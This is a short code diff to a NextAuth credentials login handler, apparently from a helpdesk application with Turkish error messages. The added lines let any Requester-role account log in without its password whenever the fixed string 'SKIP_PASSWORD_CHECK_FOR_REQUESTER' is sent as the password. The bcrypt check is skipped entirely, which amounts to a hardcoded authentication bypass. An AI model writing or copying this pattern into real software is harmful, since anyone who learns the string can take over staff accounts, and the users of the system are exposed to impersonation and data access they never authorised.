@@ -44,9 +44,20 @@ export const authOptions: AuthOptions = {
                     throw new Error('Bu hesap için şifre ile giriş yapılamaz');
                 }
 
-                const isValid = await bcrypt.compare(credentials.password, user.passwordHash);
-                if (!isValid) {
-                    throw new Error('Şifre hatalı');
+                // Password bypass for Requesters (Personnel)
+                if (credentials.password === 'SKIP_PASSWORD_CHECK_FOR_REQUESTER') {
+                    if (user.role.name === 'Admin' || user.role.name === 'Agent' || user.role.name === 'Supervisor') {
+                        throw new Error('Yöneticiler ve Destek Uzmanları şifre ile giriş yapmalıdır.');
+                    }
+                    if (user.role.name !== 'Requester') {
+                        throw new Error('Bu giriş yöntemi sadece personel içindir.');
+                    }
+                    // Bypass password check
+                } else {
+                    const isValid = await bcrypt.compare(credentials.password, user.passwordHash);
+                    if (!isValid) {
+                        throw new Error('Şifre hatalı');
+                    }
                 }
 
                 // Update last login
